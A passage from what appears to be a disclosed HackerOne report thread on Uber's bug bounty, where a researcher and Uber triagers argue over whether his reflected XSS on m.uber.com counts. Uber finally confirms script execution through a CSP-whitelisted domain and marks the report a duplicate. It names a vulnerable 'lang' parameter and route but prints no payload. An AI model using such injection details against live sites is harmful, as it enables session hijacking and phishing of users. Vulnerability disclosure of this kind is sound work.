scope. For example, here is the Uber sample report:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e## Summary\nreflected XSS in partners.uber.com\n\n## Security Impact\nSince partners.uber.com has an authenticated experience, an XSS in this domain\nmeans an attacker can forge authenticated requests on behalf of the victim.\nAlso, advanced phishing attacks and defacement are possible.\n\n## Reproduction Steps\nThis is a reflected XSS in `partners.uber.com/ via the `lang` querystring\nparameter via the route `/documents`.\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis particular issue is almost word-for-word the same as your sample vulnerability report, with a POC that executes arbitrary html from an SSL-protected Uber website, so I don\u0026#39;t know how you could possibly say this is not in scope unless you are just engaging in blatant employment discrimination at this point.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-22T19:35:16.312Z","updated_at":"2017-12-22T19:35:16.312Z","actor":{"username":"gregoryvperry","cleared":false,"url":"/gregoryvperry","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2243214,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It's not XSS if you can't get Javascript to execute -- we're verifying your most recent payloads to see if they fire Javascript and will go from there.","markdown_message":"\u003cp\u003eIt\u0026#39;s not XSS if you can\u0026#39;t get Javascript to execute -- we\u0026#39;re verifying your most recent payloads to see if they fire Javascript and will go from there.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-22T19:39:22.026Z","updated_at":"2017-12-22T19:39:22.026Z","actor":{"username":"fletcher","cleared":false,"url":"/fletcher","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/090/8b777383ddc3ab23063609c8beb1cb1f689a75c1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2243228,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello Rob,\n\nAn XSS attack is not strictly constrained to javascript, and I've demonstrated the ability to render arbitrary html that is protected by an Uber-signed SSL certificate, a critical vulnerability in the various m.uber.com endpoints that could be used to harvest privileged information from Uber customers and drivers.\n\nSome various well accepted industry definitions for what constitutes Cross Site Scripting:\n\nhttps://www.webopedia.com/TERM/X/XSS.html \"Common languages used for XSS include JavaScript, VBScript, HTML, Perl, C++, ActiveX and Flash.\"\nhttps://en.wikipedia.org/wiki/Cross-site_scripting \"The definition gradually expanded to encompass other modes of code injection, including persistent and non-JavaScript vectors (including ActiveX, Java, VBScript, Flash, or even HTML scripts), causing some confusion to newcomers to the field of information security.\"\nhttps://www.owasp.org/index.php/Types_of_Cross-Site_Scripting#Reflected_XSS_.28AKA_Non-Persistent_or_Type_II.29 \"Server XSS occurs when untrusted user supplied data is included in an HTML response generated by the server. The source of this data could be from the request, or from a stored location. As such, you can have both Reflected Server XSS and Stored Server XSS.\"\n\netc.","markdown_message":"\u003cp\u003eHello Rob,\u003c/p\u003e\n\n\u003cp\u003eAn XSS attack is not strictly constrained to javascript, and I\u0026#39;ve demonstrated the ability to render arbitrary html that is protected by an Uber-signed SSL certificate, a critical vulnerability in the various m.uber.com endpoints that could be used to harvest privileged information from Uber customers and drivers.\u003c/p\u003e\n\n\u003cp\u003eSome various well accepted industry definitions for what constitutes Cross Site Scripting:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://www.webopedia.com/TERM/X/XSS.html\" href=\"/redirect?url=https%3A%2F%2Fwww.webopedia.com%2FTERM%2FX%2FXSS.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.webopedia.com/TERM/X/XSS.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e \u0026quot;Common languages used for XSS include JavaScript, VBScript, HTML, Perl, C++, ActiveX and Flash.\u0026quot;\u003cbr\u003e\n\u003ca title=\"https://en.wikipedia.org/wiki/Cross-site_scripting\" href=\"/redirect?url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FCross-site_scripting\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://en.wikipedia.org/wiki/Cross-site_scripting\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e \u0026quot;The definition gradually expanded to encompass other modes of code injection, including persistent and non-JavaScript vectors (including ActiveX, Java, VBScript, Flash, or even HTML scripts), causing some confusion to newcomers to the field of information security.\u0026quot;\u003cbr\u003e\n\u003ca title=\"https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting#Reflected_XSS_.28AKA_Non-Persistent_or_Type_II.29\" href=\"/redirect?url=https%3A%2F%2Fwww.owasp.org%2Findex.php%2FTypes_of_Cross-Site_Scripting%23Reflected_XSS_.28AKA_Non-Persistent_or_Type_II.29\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.owasp.org/index.php/Types_of_Cross-Site_Scripting#Reflected_XSS_.28AKA_Non-Persistent_or_Type_II.29\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e \u0026quot;Server XSS occurs when untrusted user supplied data is included in an HTML response generated by the server. The source of this data could be from the request, or from a stored location. As such, you can have both Reflected Server XSS and Stored Server XSS.\u0026quot;\u003c/p\u003e\n\n\u003cp\u003eetc.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-22T19:47:34.760Z","updated_at":"2017-12-22T19:47:34.760Z","actor":{"username":"gregoryvperry","cleared":false,"url":"/gregoryvperry","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2243657,"is_internal":false,"editable":false,"type":"Activities::BugDuplicate","message":"Hey @gregperry, we were able to verify that by hosting javascript at a domain in our CSP whitelist that you would indeed be able to execute Javascript, making this reflected XSS in m.uber.com. Unfortunately, we also found this to be a duplicate of report #276134. Either way, thanks for the reports and good luck bug hunting in the future!","markdown_message":"\u003cp\u003eHey \u003ca href=\"/gregperry\"\u003e@gregperry\u003c/a\u003e, we were able to verify that by hosting javascript at a domain in our CSP whitelist that you would indeed be able to execute Javascript, making this reflected XSS in m.uber.com. Unfortunately, we also found this to be a duplicate of report \u003ca href=\"/reports/276134\"\u003e#276134\u003c/a\u003e. Either way, thanks for the reports and good luck bug hunting in the future!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-23T01:15:58.774Z","updated_at":"2017-12-23T01:15:58.774Z","original_report_id":276134,"actor":{"username":"lindsey-uber","cleared":false,"url":"/lindsey-uber","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2243658,"is_internal":false,"editable":false,"type":"Activities::CommentsClosed","message":"","markdown_message":"","automated_response":false,"created_at":"2017-12-23T01:16:05.610Z","updated_at":"2017-12-23T01:16:05.610Z","actor":{"url":"/uber","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Uber"}},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2245244,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-12-24T20:46:17.057Z","updated_at":"2017-12-24T20:46:17.057Z","first_to_agree":true,"actor":{"username":"fletcher","cleared":false,"url":"/fletcher","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/090/8b777383ddc3ab23063609c8beb1cb1f689a75c1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2246684,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2017-12-26T11:03:42.402Z","updated_at":"2017-12-26T11:03:42.402Z","actor":{"username":"fletcher","cleared":false,"url":"/fletcher","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/090/8b777383ddc3ab23063609c8beb1cb1f689a75c1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}